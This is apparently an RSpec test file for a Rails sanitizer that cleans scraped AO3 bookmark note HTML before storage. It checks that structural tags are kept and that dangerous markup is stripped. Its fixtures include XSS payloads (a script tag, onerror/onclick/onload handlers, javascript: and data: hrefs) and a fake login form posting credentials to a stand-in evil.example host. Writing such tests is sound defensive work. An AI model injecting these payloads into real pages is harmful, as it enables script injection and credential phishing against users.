require "rails_helper"

# BookmarkNoteSanitizer is the at-rest (ingest-time) sanitization boundary
# for scraped bookmark noteHtml (TECH_DEBT.md, 2026-08-01 - "relying on
# AO3's sanitizer for our own render context is fragile" / defense-in-depth
# so any future consumer inherits a safe value), applied by
# WorkDetailIngestService#replace_work_bookmarks! before note_html is
# persisted. It is a SECOND, independent boundary alongside
# frontend/src/lib/sanitizeHtml.ts (the primary render-time sanitizer), and
# applies the SAME blocklist-of-genuine-danger philosophy (TECH_DEBT.md,
# 2026-09-22 item 4): preserve structural/semantic HTML, strip known
# script-execution vectors and the interactive form-element family.
RSpec.describe BookmarkNoteSanitizer do
  describe ".sanitize" do
    it "returns nil for nil input (bookmarks with no note keep note_html nil, not empty string)" do
      expect(described_class.sanitize(nil)).to be_nil
    end

    it "returns an empty string for an empty string" do
      expect(described_class.sanitize("")).to eq("")
    end

    describe "semantic/structural tags survive sanitization" do
      it "preserves a <details>/<summary> spoiler-style collapsible section" do
        result = described_class.sanitize("<details><summary>Spoilers</summary><p>They kiss.</p></details>")

        expect(result).to include("<details>")
        expect(result).to include("<summary>")
        expect(result).to include("Spoilers")
        expect(result).to include("They kiss.")
      end

      it "preserves a <blockquote>" do
        result = described_class.sanitize("<blockquote>quoted text</blockquote>")

        expect(result).to include("<blockquote>")
        expect(result).to include("quoted text")
      end

      it "preserves list structures (<ul>/<ol>/<li>)" do
        result = described_class.sanitize("<ul><li>one</li></ul><ol><li>two</li></ol>")

        expect(result).to include("<ul>")
        expect(result).to include("<ol>")
        expect(result).to include("<li>one</li>")
        expect(result).to include("<li>two</li>")
      end

      it "preserves an <img> with a real src" do
        result = described_class.sanitize('<img src="https://example.com/pic.png" alt="a cat">')

        expect(result).to include('src="https://example.com/pic.png"')
        expect(result).to include('alt="a cat"')
      end

      it "preserves a plain <a> link's href" do
        result = described_class.sanitize('<a href="https://example.com/fic">my other fic</a>')

        expect(result).to include('href="https://example.com/fic"')
        expect(result).to include("my other fic")
      end
    end

    describe "malicious payloads are neutralized" do
      it "strips a <script> tag entirely" do
        result = described_class.sanitize('<p>hi</p><script>alert("xss")</script>')

        expect(result).not_to include("<script")
        expect(result).not_to include("alert(")
      end

      it "keeps the <img> element but drops the onerror handler" do
        result = described_class.sanitize('<img src="x" onerror="alert(1)">')

        expect(result).to include("<img")
        expect(result).not_to include("onerror")
        expect(result).not_to include("alert(1)")
      end

      it "strips a javascript: href from an anchor" do
        result = described_class.sanitize('<a href="javascript:alert(1)">click me</a>')

        expect(result).not_to include("javascript:")
      end

      it "strips a data: href from an anchor while still permitting a benign data: image" do
        result = described_class.sanitize('<a href="data:text/html,<script>alert(1)</script>">click</a>')

        expect(result).not_to include("<script")
      end

      it "strips an onclick handler from a benign-looking element" do
        result = described_class.sanitize('<p onclick="alert(1)">click me</p>')

        expect(result).not_to include("onclick")
        expect(result).not_to include("alert(1)")
      end

      it "strips an <iframe>" do
        result = described_class.sanitize('<iframe src="https://evil.example"></iframe>')

        expect(result).not_to include("<iframe")
      end

      it "strips an onload handler from an <svg>" do
        result = described_class.sanitize('<svg onload="alert(1)"></svg>')

        expect(result).not_to include("onload")
        expect(result).not_to include("alert(1)")
      end

      it "strips a <style> block" do
        result = described_class.sanitize("<style>body{background:url(javascript:alert(1))}</style>")

        expect(result).not_to include("<style")
        expect(result).not_to include("alert(1)")
      end
    end

    describe "interactive form elements are stripped (phishing-form closure)" do
      it "strips a full fake-login form end to end, keeping no interactive remnants" do
        result = described_class.sanitize(
          '<form action="https://evil.example/phish" method="post">' \
          '<input type="text" name="username" placeholder="AO3 username">' \
          '<input type="password" name="password" placeholder="Password">' \
          "<button>Log in</button></form>",
        )

        expect(result).not_to include("<form")
        expect(result).not_to include("<input")
        expect(result).not_to include("<button")
        expect(result).not_to include("evil.example")
      end

      it "strips a <textarea>" do
        expect(described_class.sanitize("<textarea>hi</textarea>")).not_to include("<textarea")
      end

      it "strips a <select>/<option>" do
        result = described_class.sanitize("<select><option>a</option></select>")

        expect(result).not_to include("<select")
        expect(result).not_to include("<option")
      end
    end
  end
end
